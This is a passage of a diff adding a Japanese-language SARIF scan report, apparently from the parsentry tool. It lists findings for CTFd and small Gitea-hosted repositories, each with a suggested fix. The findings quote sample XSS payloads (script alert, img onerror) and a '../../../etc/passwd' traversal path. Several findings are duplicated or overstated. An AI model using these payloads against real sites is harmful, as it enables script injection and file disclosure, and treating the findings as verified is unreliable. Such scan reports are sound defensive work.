+            "markdown": "### SQL Injection Vulnerability\n\n**説明**: \nSQLAlchemyのパラメータバインディングを使用せず、f-stringで直接`proc_id`をSQL文に埋め込んでいます。`proc_id`はMySQLの`SHOW PROCESSLIST`結果から取得されますが、整数値として検証されていません。\n\n**脆弱性の詳細**:\n- **Principal**: MySQL SHOW PROCESSLIST の実行結果（信頼できないデータソース）\n- **Action**: 入力検証なし - proc_id は型チェックされていない文字列値\n- **Resource**: `db.session.execute()` による直接SQL実行\n- **Data Flow**: `SHOW PROCESSLIST` → `proc.Id` → f-string補間 → `KILL` コマンド実行\n\n**攻撃ベクトル**: T1190 (Exploit Public-Facing Application)\n\n**推奨修正**:\nSQLAlchemyのパラメータバインディングを使用してください:\n```python\nfrom sqlalchemy import text\ndb.session.execute(text(\"KILL :proc_id\"), {\"proc_id\": proc_id})\n```\n\n**リスク**: MySQL のプロセス実行制御をバイパスされる可能性があります。"
+          },
+          "locations": [
+            {
+              "physicalLocation": {
+                "artifactLocation": {
+                  "uri": "repo/ctfd/data/CTFd/CTFd/utils/exports/__init__.py",
+                  "index": 26
+                }
+              }
+            }
+          ],
+          "fingerprints": {
+            "parsentry/v1": "1696a5b7d66b2c15"
+          },
+          "properties": {
+            "confidence": 0.8,
+            "mitre_attack": [
+              "T1190"
+            ],
+            "cwe": [
+              "CWE-89"
+            ],
+            "owasp": [
+              "A03:2021-Injection"
+            ],
+            "principal": "MySQL SHOW PROCESSLIST result (proc.Id field)",
+            "action": "No input validation - f-string interpolation without SQLAlchemy parameter binding",
+            "resource": "db.session.execute() - Direct SQL execution",
+            "data_flow": "SHOW PROCESSLIST → proc.Id → f-string → KILL command"
+          }
+        },
+        {
+          "ruleId": "SQLI",
+          "ruleIndex": 0,
+          "level": "warning",
+          "message": {
+            "text": "SQLI: ### SQL Injection Vulnerability\n\n**説明**: \nSQLAlchemyのパラメータバインディングを使用せず、f-stringで直接`proc_id`をSQL文に埋め込んでいます。`proc_id`はMySQLの`SHOW PROCESSLIST`結果から取得されますが、整数値として検証されていません。\n\n**脆弱性の詳細**:\n- **Principal**: MySQL SHOW PROCESSLIST の実行結果（信頼できないデータソース）\n- **Action**: 入力検証なし - proc_id は型チェックされていない文字列値\n- **Resource**: `db.session.execute()` による直接SQL実行\n- **Data Flow**: `SHOW PROCESSLIST` → `proc.Id` → f-string補間 → `KILL` コマンド実行\n\n**攻撃ベクトル**: T1190 (Exploit Public-Facing Application)\n\n**推奨修正**:\nSQLAlchemyのパラメータバインディングを使用してください:\n```python\nfrom sqlalchemy import text\ndb.session.execute(text(\"KILL :proc_id\"), {\"proc_id\": proc_id})\n```\n\n**リスク**: MySQL のプロセス実行制御をバイパスされる可能性があります。",
+            "markdown": "### SQL Injection Vulnerability\n\n**説明**: \nSQLAlchemyのパラメータバインディングを使用せず、f-stringで直接`proc_id`をSQL文に埋め込んでいます。`proc_id`はMySQLの`SHOW PROCESSLIST`結果から取得されますが、整数値として検証されていません。\n\n**脆弱性の詳細**:\n- **Principal**: MySQL SHOW PROCESSLIST の実行結果（信頼できないデータソース）\n- **Action**: 入力検証なし - proc_id は型チェックされていない文字列値\n- **Resource**: `db.session.execute()` による直接SQL実行\n- **Data Flow**: `SHOW PROCESSLIST` → `proc.Id` → f-string補間 → `KILL` コマンド実行\n\n**攻撃ベクトル**: T1190 (Exploit Public-Facing Application)\n\n**推奨修正**:\nSQLAlchemyのパラメータバインディングを使用してください:\n```python\nfrom sqlalchemy import text\ndb.session.execute(text(\"KILL :proc_id\"), {\"proc_id\": proc_id})\n```\n\n**リスク**: MySQL のプロセス実行制御をバイパスされる可能性があります。"
+          },
+          "locations": [
+            {
+              "physicalLocation": {
+                "artifactLocation": {
+                  "uri": "repo/ctfd/data/CTFd/CTFd/utils/exports/__init__.py",
+                  "index": 27
+                }
+              }
+            }
+          ],
+          "fingerprints": {
+            "parsentry/v1": "1696a5b7d66b2c15"
+          },
+          "properties": {
+            "confidence": 0.8,
+            "mitre_attack": [
+              "T1190"
+            ],
+            "cwe": [
+              "CWE-89"
+            ],
+            "owasp": [
+              "A03:2021-Injection"
+            ],
+            "principal": "MySQL SHOW PROCESSLIST result (proc.Id field)",
+            "action": "No input validation - f-string interpolation without SQLAlchemy parameter binding",
+            "resource": "db.session.execute() - Direct SQL execution",
+            "data_flow": "SHOW PROCESSLIST → proc.Id → f-string → KILL command"
+          }
+        },
+        {
+          "ruleId": "PARSE_ERROR",
+          "ruleIndex": 7,
+          "level": "warning",
+          "message": {
+            "text": "PARSE_ERROR: ## 脆弱性分析\n\n### 概要\n`JSON.parse()`がクライアント側の信頼されないデータソース（`localStorage`）から取得した値に対して直接実行されており、例外処理がありません。\n\n### Principal（信頼されないデータソース）\n- **`event.newValue`**: `storage`イベントから取得される値\n- ブラウザの`localStorage`はクライアント側で改ざん可能なため、信頼されないデータ源\n- 悪意のあるスクリプトまたはブラウザコンソールからの直接操作で変更可能\n\n### Action（セキュリティコントロール）\n現状では以下のコントロールのみ:\n```javascript\nif (event.key == \"integrations\" && event.newValue) {\n  let integration = JSON.parse(event.newValue);\n```\n\n- キー名の検証: あり（`event.key == \"integrations\"`）\n- 値の形式検証: なし\n- JSON解析時の例外処理: なし\n- パース後のデータ型チェック: なし\n\n### Resource（センシティブな操作）\n- DOM操作による UI状態の変更\n- `localStorage.removeItem()`による状態管理\n\n### 攻撃シナリオ\n1. 攻撃者が`localStorage['integrations']`に不正なJSON（例: `\"{invalid json}\"` または `\"123\"`）を設定\n2. 別のタブ/ウィンドウで`storage`イベントがトリガー\n3. `JSON.parse()`が例外を発生させ、アプリケーションが予期しない動作をする可能性\n\n### 技術的な問題\n- **例外の未処理**: `JSON.parse()`は不正なJSON形式で`SyntaxError`を発生させるが、`try-catch`ブロックがない\n- **入力値の非検証**: パース前に形式の妥当性を検証していない\n- **パース後のスキーマ検証**: パース後のオブジェクトの構造や型を検証していない\n\n### 推奨される修正\n```javascript\nwindow.addEventListener(\"storage\", function(event) {\n  if (event.key == \"integrations\" && event.newValue) {\n    try {\n      let integration = JSON.parse(event.newValue);\n      if (typeof integration === \"object\" && integration !== null && integration[\"name\"] === \"mlc\") {\n        $(\"#integration-mlc\")\n          .text(\"Already Configured\")\n          .attr(\"disabled\", true);\n        window.focus();\n        localStorage.removeItem(\"integrations\");\n      }\n    } catch (e) {\n      console.error(\"Failed to parse integration data\", e);\n      localStorage.removeItem(\"integrations\");\n    }\n  }\n});\n```",
+            "markdown": "## 脆弱性分析\n\n### 概要\n`JSON.parse()`がクライアント側の信頼されないデータソース（`localStorage`）から取得した値に対して直接実行されており、例外処理がありません。\n\n### Principal（信頼されないデータソース）\n- **`event.newValue`**: `storage`イベントから取得される値\n- ブラウザの`localStorage`はクライアント側で改ざん可能なため、信頼されないデータ源\n- 悪意のあるスクリプトまたはブラウザコンソールからの直接操作で変更可能\n\n### Action（セキュリティコントロール）\n現状では以下のコントロールのみ:\n```javascript\nif (event.key == \"integrations\" && event.newValue) {\n  let integration = JSON.parse(event.newValue);\n```\n\n- キー名の検証: あり（`event.key == \"integrations\"`）\n- 値の形式検証: なし\n- JSON解析時の例外処理: なし\n- パース後のデータ型チェック: なし\n\n### Resource（センシティブな操作）\n- DOM操作による UI状態の変更\n- `localStorage.removeItem()`による状態管理\n\n### 攻撃シナリオ\n1. 攻撃者が`localStorage['integrations']`に不正なJSON（例: `\"{invalid json}\"` または `\"123\"`）を設定\n2. 別のタブ/ウィンドウで`storage`イベントがトリガー\n3. `JSON.parse()`が例外を発生させ、アプリケーションが予期しない動作をする可能性\n\n### 技術的な問題\n- **例外の未処理**: `JSON.parse()`は不正なJSON形式で`SyntaxError`を発生させるが、`try-catch`ブロックがない\n- **入力値の非検証**: パース前に形式の妥当性を検証していない\n- **パース後のスキーマ検証**: パース後のオブジェクトの構造や型を検証していない\n\n### 推奨される修正\n```javascript\nwindow.addEventListener(\"storage\", function(event) {\n  if (event.key == \"integrations\" && event.newValue) {\n    try {\n      let integration = JSON.parse(event.newValue);\n      if (typeof integration === \"object\" && integration !== null && integration[\"name\"] === \"mlc\") {\n        $(\"#integration-mlc\")\n          .text(\"Already Configured\")\n          .attr(\"disabled\", true);\n        window.focus();\n        localStorage.removeItem(\"integrations\");\n      }\n    } catch (e) {\n      console.error(\"Failed to parse integration data\", e);\n      localStorage.removeItem(\"integrations\");\n    }\n  }\n});\n```"
+          },
+          "locations": [
+            {
+              "physicalLocation": {
+                "artifactLocation": {
+                  "uri": "repo/ctfd/data/CTFd/CTFd/themes/core/assets/js/pages/setup.js",
+                  "index": 28
+                }
+              }
+            }
+          ],
+          "fingerprints": {
+            "parsentry/v1": "9748aea73aca97ea"
+          },
+          "properties": {
+            "confidence": 0.8,
+            "mitre_attack": [],
+            "cwe": [],
+            "owasp": [],
+            "principal": "event.newValue from window.storage event (untrusted localStorage data)",
+            "action": "Minimal validation (key check only), no JSON parsing error handling",
+            "resource": "DOM manipulation and localStorage state management",
+            "data_flow": "localStorage → storage event → JSON.parse() → DOM update"
+          }
+        },
+        {
+          "ruleId": "XSS",
+          "ruleIndex": 1,
+          "level": "warning",
+          "message": {
+            "text": "XSS: ## テーマヘッダーの XSS 脆弱性\n\n### 問題の説明\nLine 317-325 で `document.getElementById(\"theme-header\")` により、HTMLMixed モードの CodeMirror エディタが初期化されています。このエディタはユーザー入力を受け付け、HTML/CSS コンテンツを管理します。\n\n### PAR フレームワーク分析\n\n**Principal (信頼できない情報源)**\n- ユーザーが CodeMirror エディタを通じて入力するテーマヘッダーHTML\n- サーバーから返されたテーマヘッダー設定値\n\n**Action (セキュリティ制御)**\n- HTMLMixed モードでの直接入力受け入れ\n- バリデーションやサニタイズが見当たらない\n- ユーザー権限チェックなし（管理者のみとしても、XSS は内部脅威になり得る）\n\n**Resource (攻撃対象)**\n- `theme_header_editor.getDoc().setValue(new_css)` (Line 431)\n- サーバー設定として保存される可能性\n- 他のユーザーに配信されるテーマコンテンツ\n\n### データフロー\n```\nユーザー入力 (CodeMirror HTMLMixed) → \ngetValue() 取得 → \nserializeJSON() で JSON化 → \nCTFd.api.patch_config_list() でサーバー送信 → \n他ユーザーが受信・レンダリング → \nXSS 実行\n```\n\n### 攻撃シナリオ\n1. 攻撃者が管理画面にアクセス\n2. テーマヘッダーエディタに悪意ある JavaScript を含むHTML を入力\n3. 例: `<style id=\"theme-color\">\\n<script>alert('xss')</script>\\n</style>`\n4. 設定を保存\n5. 他のユーザーがサイトを訪問時に、テーマヘッダーが注入スクリプトを実行\n\n### 推奨される改善\n1. HTML入力の厳密なバリデーション（ホワイトリストベース）\n2. DOMPurify ライブラリ等を使用したサニタイズ\n3. Content Security Policy (CSP) ヘッダーの導入\n4. 入力の HTML エスケープ処理",
+            "markdown": "## テーマヘッダーの XSS 脆弱性\n\n### 問題の説明\nLine 317-325 で `document.getElementById(\"theme-header\")` により、HTMLMixed モードの CodeMirror エディタが初期化されています。このエディタはユーザー入力を受け付け、HTML/CSS コンテンツを管理します。\n\n### PAR フレームワーク分析\n\n**Principal (信頼できない情報源)**\n- ユーザーが CodeMirror エディタを通じて入力するテーマヘッダーHTML\n- サーバーから返されたテーマヘッダー設定値\n\n**Action (セキュリティ制御)**\n- HTMLMixed モードでの直接入力受け入れ\n- バリデーションやサニタイズが見当たらない\n- ユーザー権限チェックなし（管理者のみとしても、XSS は内部脅威になり得る）\n\n**Resource (攻撃対象)**\n- `theme_header_editor.getDoc().setValue(new_css)` (Line 431)\n- サーバー設定として保存される可能性\n- 他のユーザーに配信されるテーマコンテンツ\n\n### データフロー\n```\nユーザー入力 (CodeMirror HTMLMixed) → \ngetValue() 取得 → \nserializeJSON() で JSON化 → \nCTFd.api.patch_config_list() でサーバー送信 → \n他ユーザーが受信・レンダリング → \nXSS 実行\n```\n\n### 攻撃シナリオ\n1. 攻撃者が管理画面にアクセス\n2. テーマヘッダーエディタに悪意ある JavaScript を含むHTML を入力\n3. 例: `<style id=\"theme-color\">\\n<script>alert('xss')</script>\\n</style>`\n4. 設定を保存\n5. 他のユーザーがサイトを訪問時に、テーマヘッダーが注入スクリプトを実行\n\n### 推奨される改善\n1. HTML入力の厳密なバリデーション（ホワイトリストベース）\n2. DOMPurify ライブラリ等を使用したサニタイズ\n3. Content Security Policy (CSP) ヘッダーの導入\n4. 入力の HTML エスケープ処理"
+          },
+          "locations": [
+            {
+              "physicalLocation": {
+                "artifactLocation": {
+                  "uri": "repo/ctfd/data/CTFd/themes/admin/assets/js/pages/configs.js",
+                  "index": 29
+                }
+              }
+            }
+          ],
+          "fingerprints": {
+            "parsentry/v1": "7f97ce31a7bd22d5"
+          },
+          "properties": {
+            "confidence": 0.8,
+            "mitre_attack": [
+              "T1190",
+              "T1185"
+            ],
+            "cwe": [
+              "CWE-79",
+              "CWE-80"
+            ],
+            "owasp": [
+              "A03:2021-Injection"
+            ],
+            "principal": "User-supplied HTML/CSS in theme header via CodeMirror editor",
+            "action": "HTMLMixed mode accepts arbitrary HTML without sanitization or validation",
+            "resource": "Theme configuration stored server-side and delivered to all site visitors",
+            "data_flow": "CodeMirror input → getDoc().setValue() → patch_config_list() API → Server storage → Client-side rendering"
+          }
+        },
+        {
+          "ruleId": "XSS",
+          "ruleIndex": 1,
+          "level": "warning",
+          "message": {
+            "text": "XSS: ## XSS脆弱性：APIレスポンスデータの直接DOM注入\n\n### 脆弱性の詳細\n\n**PAR分析:**\n- **Principal (主体)**: CTFdバックエンドAPI（`/api/v1/challenges/` エンドポイント）からのレスポンスデータ\n- **Action (制御)**: サニタイゼーションまたはバリデーション処理がない\n- **Resource (リソース)**: DOM への直接HTML注入（`append()` メソッド経由）\n\n### 問題のコード\n```javascript\n// Line 259: APIレスポンスの view プロパティを取得\nchallenge.data = response.data;\n\n// Line 266: サニタイゼーションなしでDOM に直接注入\n$(\"#challenge-window\").append(challenge_data.view);\n```\n\n### 攻撃シナリオ\n1. 攻撃者がバックエンドAPI（管理画面のチャレンジデータベース）を侵害\n2. チャレンジの `view` フィールドにペイロードを注入: `<img src=x onerror='alert(\\\"XSS\\\")'>`\n3. 管理者がチャレンジをプレビューすると、JavaScriptコードが実行される\n4. セッショントークン、CSRF トークン、機密情報の窃取が可能\n\n### データフロー\n```\nCTFd Backend API (compromised) \n  ↓\nresponse.data.view\n  ↓\n$(\"#challenge-window\").append() [No sanitization]\n  ↓\nDOM に悪意あるHTML/JavaScript がレンダリング\n```\n\n### 推奨修正\n1. Vue.js を使用する場合は、テンプレート内で自動的にエスケープされるプロパティバインディングを使用\n2. jQuery の場合、`.text()` を使用する（HTMLではなくテキストのみを挿入）\n3. DOMPurify などのHTMLサニタイザーライブラリを使用してAPIレスポンスをクリーニング\n\n### 関連するセキュリティ標準\n- OWASP Top 10 2021: A03:2021 – Injection\n- CWE-79: Improper Neutralization of Input During Web Page Generation ('Cross-site Scripting')\n- CVSS v3.1 Base Score: 6.1 (Medium) - Requires backend compromise, but impact is high (admin account)\n\n### 影響度\nこれは管理画面のコンテキストにあるため、影響範囲は限定されていますが、バックエンド侵害時のコード実行リスクは深刻です。",
+            "markdown": "## XSS脆弱性：APIレスポンスデータの直接DOM注入\n\n### 脆弱性の詳細\n\n**PAR分析:**\n- **Principal (主体)**: CTFdバックエンドAPI（`/api/v1/challenges/` エンドポイント）からのレスポンスデータ\n- **Action (制御)**: サニタイゼーションまたはバリデーション処理がない\n- **Resource (リソース)**: DOM への直接HTML注入（`append()` メソッド経由）\n\n### 問題のコード\n```javascript\n// Line 259: APIレスポンスの view プロパティを取得\nchallenge.data = response.data;\n\n// Line 266: サニタイゼーションなしでDOM に直接注入\n$(\"#challenge-window\").append(challenge_data.view);\n```\n\n### 攻撃シナリオ\n1. 攻撃者がバックエンドAPI（管理画面のチャレンジデータベース）を侵害\n2. チャレンジの `view` フィールドにペイロードを注入: `<img src=x onerror='alert(\\\"XSS\\\")'>`\n3. 管理者がチャレンジをプレビューすると、JavaScriptコードが実行される\n4. セッショントークン、CSRF トークン、機密情報の窃取が可能\n\n### データフロー\n```\nCTFd Backend API (compromised) \n  ↓\nresponse.data.view\n  ↓\n$(\"#challenge-window\").append() [No sanitization]\n  ↓\nDOM に悪意あるHTML/JavaScript がレンダリング\n```\n\n### 推奨修正\n1. Vue.js を使用する場合は、テンプレート内で自動的にエスケープされるプロパティバインディングを使用\n2. jQuery の場合、`.text()` を使用する（HTMLではなくテキストのみを挿入）\n3. DOMPurify などのHTMLサニタイザーライブラリを使用してAPIレスポンスをクリーニング\n\n### 関連するセキュリティ標準\n- OWASP Top 10 2021: A03:2021 – Injection\n- CWE-79: Improper Neutralization of Input During Web Page Generation ('Cross-site Scripting')\n- CVSS v3.1 Base Score: 6.1 (Medium) - Requires backend compromise, but impact is high (admin account)\n\n### 影響度\nこれは管理画面のコンテキストにあるため、影響範囲は限定されていますが、バックエンド侵害時のコード実行リスクは深刻です。"
+          },
+          "locations": [
+            {
+              "physicalLocation": {
+                "artifactLocation": {
+                  "uri": "repo/ctfd/data/CTFd/themes/admin/assets/js/pages/challenge.js",
+                  "index": 30
+                }
+              }
+            }
+          ],
+          "fingerprints": {
+            "parsentry/v1": "a4ef49649854b0ea"
+          },
+          "properties": {
+            "confidence": 0.8,
+            "mitre_attack": [
+              "T1190",
+              "T1185"
+            ],
+            "cwe": [
+              "CWE-79",
+              "CWE-80"
+            ],
+            "owasp": [
+              "A03:2021-Injection"
+            ],
+            "principal": "API response data from CTFd backend (/api/v1/challenges/)",
+            "action": "No sanitization or validation of HTML content",
+            "resource": "DOM injection via $(\"#challenge-window\").append(challenge_data.view)",
+            "data_flow": "Backend API response → challenge_data.view → DOM append"
+          }
+        },
+        {
+          "ruleId": "AFO",
+          "ruleIndex": 2,
+          "level": "warning",
+          "message": {
+            "text": "AFO: ## AWS S3 レプリケーション権限の過度な設定\n\n### 問題の詳細\nIAMポリシー「replication」(行37-77)内のS3レプリケーション関連アクション（`s3:ReplicateObject`, `s3:ReplicateDelete`, `s3:ReplicateTags`）に対して、リソースが`${aws_s3_bucket.backup.arn}/*`というワイルドカードで指定されています。\n\n### セキュリティリスク\n- **Principal**: S3レプリケーションサービス（IAMロール経由）\n- **Action**: リソース指定時にワイルドカード`/*`を使用（不適切な権限委譲）\n- **Resource**: バックアップバケット内のすべてのオブジェクト\n- **Data Flow**: dodoバケット → レプリケーション処理 → backupバケット内の全オブジェクト\n\n### 推奨される改善\nリソース仕様を以下のように特定のプレフィックスに限定することを検討してください：\n```json\n\"Resource\": \"${aws_s3_bucket.backup.arn}/replication/*\"\n```\n\n### 影響\nレプリケーション処理中に、意図しないオブジェクトへのアクセスが可能になる可能性があります。",
+            "markdown": "## AWS S3 レプリケーション権限の過度な設定\n\n### 問題の詳細\nIAMポリシー「replication」(行37-77)内のS3レプリケーション関連アクション（`s3:ReplicateObject`, `s3:ReplicateDelete`, `s3:ReplicateTags`）に対して、リソースが`${aws_s3_bucket.backup.arn}/*`というワイルドカードで指定されています。\n\n### セキュリティリスク\n- **Principal**: S3レプリケーションサービス（IAMロール経由）\n- **Action**: リソース指定時にワイルドカード`/*`を使用（不適切な権限委譲）\n- **Resource**: バックアップバケット内のすべてのオブジェクト\n- **Data Flow**: dodoバケット → レプリケーション処理 → backupバケット内の全オブジェクト\n\n### 推奨される改善\nリソース仕様を以下のように特定のプレフィックスに限定することを検討してください：\n```json\n\"Resource\": \"${aws_s3_bucket.backup.arn}/replication/*\"\n```\n\n### 影響\nレプリケーション処理中に、意図しないオブジェクトへのアクセスが可能になる可能性があります。"
+          },
+          "locations": [
+            {
+              "physicalLocation": {
+                "artifactLocation": {
+                  "uri": "repo/gitea/repositories/dodo/main.tf",
+                  "index": 31
+                }
+              }
+            }
+          ],
+          "fingerprints": {
+            "parsentry/v1": "121546a7c81f9fa1"
+          },
+          "properties": {
+            "confidence": 0.75,
+            "mitre_attack": [
+              "T1083",
+              "T1005"
+            ],
+            "cwe": [
+              "CWE-22",
+              "CWE-73"
+            ],
+            "owasp": [
+              "A01:2021-Broken Access Control"
+            ],
+            "principal": "S3 replication service role (aws_iam_role.replication)",
+            "action": "Wildcard resource specification without prefix limiting",
+            "resource": "aws_s3_bucket.backup all objects (arn:aws:s3:::backup/*)",
+            "data_flow": "Replication configuration → IAM policy → S3 objects"
+          }
+        },
+        {
+          "ruleId": "AFO",
+          "ruleIndex": 2,
+          "level": "warning",
+          "message": {
+            "text": "AFO: ## パス検証なしでのファイル操作\n\n`oauth2_file`パラメータが直接ファイル操作に使用されています。\n\n### 問題点:\n- `os.path.expanduser()`は使用されていますが、パストラバーサル攻撃を防ぎません\n- ユーザーが`../../../etc/passwd`のようなパスを指定できます\n- ディレクトリトラバーサル攻撃により、任意の場所にファイルを書き込む可能性があります\n\n### データフロー:\n1. **Principal (主体)**: 関数引数 `oauth2_file` (ユーザー制御)\n2. **Action (制御)**: なし（検証なし）\n3. **Resource (リソース)**: ファイルシステム書き込み操作\n\n### 影響:\n- 任意のファイルシステムロケーションへの読み書き\n- システム設定ファイルの上書き\n- 権限昇格の可能性\n\n### 対策:\n- `os.path.abspath()`で絶対パスに正規化\n- ホームディレクトリ内のみに制限\n- パストラバーサルシーケンス(`..`, `//`)の検証",
+            "markdown": "## パス検証なしでのファイル操作\n\n`oauth2_file`パラメータが直接ファイル操作に使用されています。\n\n### 問題点:\n- `os.path.expanduser()`は使用されていますが、パストラバーサル攻撃を防ぎません\n- ユーザーが`../../../etc/passwd`のようなパスを指定できます\n- ディレクトリトラバーサル攻撃により、任意の場所にファイルを書き込む可能性があります\n\n### データフロー:\n1. **Principal (主体)**: 関数引数 `oauth2_file` (ユーザー制御)\n2. **Action (制御)**: なし（検証なし）\n3. **Resource (リソース)**: ファイルシステム書き込み操作\n\n### 影響:\n- 任意のファイルシステムロケーションへの読み書き\n- システム設定ファイルの上書き\n- 権限昇格の可能性\n\n### 対策:\n- `os.path.abspath()`で絶対パスに正規化\n- ホームディレクトリ内のみに制限\n- パストラバーサルシーケンス(`..`, `//`)の検証"
+          },
+          "locations": [
+            {
+              "physicalLocation": {
+                "artifactLocation": {
+                  "uri": "repo/gitea/repositories/mad-hatter/yagmail/oauth2.py",
+                  "index": 32
+                }
+              }
+            }
+          ],
+          "fingerprints": {
+            "parsentry/v1": "fbac3d309b42daa5"
+          },
+          "properties": {
+            "confidence": 0.75,
+            "mitre_attack": [
+              "T1083",
+              "T1005"
+            ],
+            "cwe": [
+              "CWE-22",
+              "CWE-73"
+            ],
+            "owasp": [
+              "A01:2021-Broken Access Control"
+            ],
+            "principal": "User-controlled oauth2_file parameter",
+            "action": "No path validation or sanitization",
+            "resource": "File system write operation (open with 'w' mode)",
+            "data_flow": "oauth2_file (parameter) -> os.path.expanduser() -> open(oauth2_file, 'w')"
+          }
+        },
+        {
+          "ruleId": "RCE",
+          "ruleIndex": 6,
+          "level": "warning",
+          "message": {
+            "text": "RCE: ### RCE脆弱性: subprocess.check_outputによるコマンド実行\n\n**Principal（主体）**: システム環境、PATH環境変数\n\n**Resource（リソース）**: プロセス実行（subprocess.check_output）\n\n**Action（アクション）**: 検証なし\n\n**詳細分析**:\n\n1. **脆弱性箇所**: 63行目\n```python\nfor line in subprocess.check_output(['tox', '--listenvs'], universal_newlines=True).splitlines()\n```\n\n2. **攻撃シナリオ**:\n   - `tox`がインストールされていないまたはPATHに存在しない場合\n   - 攻撃者が同じ名前の悪意あるスクリプトをPATH上に配置\n   - スクリプト実行時に悪意あるコードが実行される\n\n3. **Data Flow**:\n   - システム環境（Principal）→ subprocess実行 → tox出力取得\n   - 取得した環境名を処理（64-71行目）\n   - テンプレート変数に格納（68-71行目）\n   - ファイル生成時に使用（76行目）\n\n4. **影響範囲**: CI/CDパイプラインの完全な侵害\n\n**推奨対策**:\n- 絶対パスでコマンドを指定\n- tox実行前に存在確認\n- 出力結果のサニタイズ",
+            "markdown": "### RCE脆弱性: subprocess.check_outputによるコマンド実行\n\n**Principal（主体）**: システム環境、PATH環境変数\n\n**Resource（リソース）**: プロセス実行（subprocess.check_output）\n\n**Action（アクション）**: 検証なし\n\n**詳細分析**:\n\n1. **脆弱性箇所**: 63行目\n```python\nfor line in subprocess.check_output(['tox', '--listenvs'], universal_newlines=True).splitlines()\n```\n\n2. **攻撃シナリオ**:\n   - `tox`がインストールされていないまたはPATHに存在しない場合\n   - 攻撃者が同じ名前の悪意あるスクリプトをPATH上に配置\n   - スクリプト実行時に悪意あるコードが実行される\n\n3. **Data Flow**:\n   - システム環境（Principal）→ subprocess実行 → tox出力取得\n   - 取得した環境名を処理（64-71行目）\n   - テンプレート変数に格納（68-71行目）\n   - ファイル生成時に使用（76行目）\n\n4. **影響範囲**: CI/CDパイプラインの完全な侵害\n\n**推奨対策**:\n- 絶対パスでコマンドを指定\n- tox実行前に存在確認\n- 出力結果のサニタイズ"
+          },
+          "locations": [
+            {
+              "physicalLocation": {
+                "artifactLocation": {
+                  "uri": "repo/gitea/repositories/reportcov/ci/bootstrap.py",
+                  "index": 33
+                }
+              }
+            }
+          ],
+          "fingerprints": {
+            "parsentry/v1": "f896e614568c7f0"
+          },
+          "properties": {
+            "confidence": 0.75,
+            "mitre_attack": [
+              "T1190",
+              "T1059"
+            ],
+            "cwe": [
+              "CWE-77",
+              "CWE-78",
+              "CWE-94"
+            ],
+            "owasp": [
+              "A03:2021-Injection"
+            ],
+            "principal": "System environment, PATH variable",
+            "action": "No validation of tox command location",
+            "resource": "subprocess.check_output process execution",
+            "data_flow": "System environment → subprocess.check_output → output processing → template variables → file generation"
+          }
+        },
+        {
+          "ruleId": "XSS",
+          "ruleIndex": 1,
+          "level": "warning",
+          "message": {
+            "text": "XSS: ### DOM-based XSS 脆弱性\n\n**箇所**: `configs.js:385`\n\n**問題点**:\n```javascript\nvar ctrl = form.find(`[name='${key}']`);\n```\n\nテーマ設定のJSONパース結果(`data`)から取得した`key`がテンプレートリテラルに直接埋め込まれています。ユーザーが制御可能なJSONコンテンツから取得したキー値が、そのまま属性セレクタの構築に使用されます。\n\n**攻撃ベクトル**:\n- JSONに`\"]`を含むキー名を挿入することで、セレクタを閉じて任意のセレクタを追加可能\n- 例: キー名が`test'] [type='hidden`の場合、セレクタは`[name='test'] [type='hidden']`となり、意図しない要素が選択される\n\n**Principal**: テーマ設定JSON内のユーザー制御可能なキー名 (line 379)\n\n**Action**: セレクタ構築時のバリデーション不足\n\n**Resource**: DOM操作と属性値の設定\n\n**Data Flow**: `theme_settings_editor.getValue()` → `JSON.parse()` → `$.each(data, ...)` → `form.find(`[name='${key}']`)`\n",
+            "markdown": "### DOM-based XSS 脆弱性\n\n**箇所**: `configs.js:385`\n\n**問題点**:\n```javascript\nvar ctrl = form.find(`[name='${key}']`);\n```\n\nテーマ設定のJSONパース結果(`data`)から取得した`key`がテンプレートリテラルに直接埋め込まれています。ユーザーが制御可能なJSONコンテンツから取得したキー値が、そのまま属性セレクタの構築に使用されます。\n\n**攻撃ベクトル**:\n- JSONに`\"]`を含むキー名を挿入することで、セレクタを閉じて任意のセレクタを追加可能\n- 例: キー名が`test'] [type='hidden`の場合、セレクタは`[name='test'] [type='hidden']`となり、意図しない要素が選択される\n\n**Principal**: テーマ設定JSON内のユーザー制御可能なキー名 (line 379)\n\n**Action**: セレクタ構築時のバリデーション不足\n\n**Resource**: DOM操作と属性値の設定\n\n**Data Flow**: `theme_settings_editor.getValue()` → `JSON.parse()` → `$.each(data, ...)` → `form.find(`[name='${key}']`)`\n"
+          },
+          "locations": [
+            {
+              "physicalLocation": {
+                "artifactLocation": {
+                  "uri": "repo/ctfd/data/CTFd/themes/admin/assets/js/pages/configs.js",
+                  "index": 34
+                }
+              }
+            }
+          ],
+          "fingerprints": {
+            "parsentry/v1": "aba93f605390a773"
+          },
+          "properties": {
+            "confidence": 0.75,
+            "mitre_attack": [
+              "T1190",
+              "T1185"
+            ],
+            "cwe": [
+              "CWE-79",
+              "CWE-80"
+            ],
+            "owasp": [
+              "A03:2021-Injection"
+            ],
+            "principal": "User-controlled JSON keys from theme settings editor",
+            "action": "No validation of key names before DOM selector construction",
+            "resource": "DOM element selection and manipulation",
+            "data_flow": "theme_settings_editor.getValue() → JSON.parse() → form.find([name='${key}'])"
+          }
+        },
+        {
+          "ruleId": "XSS",
+          "ruleIndex": 1,
+          "level": "warning",
+          "message": {
+            "text": "XSS: ### DOM-based XSS 脆弱性\n\n**箇所**: `configs.js:385`\n\n**問題点**:\n```javascript\nvar ctrl = form.find(`[name='${key}']`);\n```\n\nテーマ設定のJSONパース結果(`data`)から取得した`key`がテンプレートリテラルに直接埋め込まれています。ユーザーが制御可能なJSONコンテンツから取得したキー値が、そのまま属性セレクタの構築に使用されます。\n\n**攻撃ベクトル**:\n- JSONに`\"]`を含むキー名を挿入することで、セレクタを閉じて任意のセレクタを追加可能\n- 例: キー名が`test'] [type='hidden`の場合、セレクタは`[name='test'] [type='hidden']`となり、意図しない要素が選択される\n\n**Principal**: テーマ設定JSON内のユーザー制御可能なキー名 (line 379)\n\n**Action**: セレクタ構築時のバリデーション不足\n\n**Resource**: DOM操作と属性値の設定\n\n**Data Flow**: `theme_settings_editor.getValue()` → `JSON.parse()` → `$.each(data, ...)` → `form.find(`[name='${key}']`)`\n",
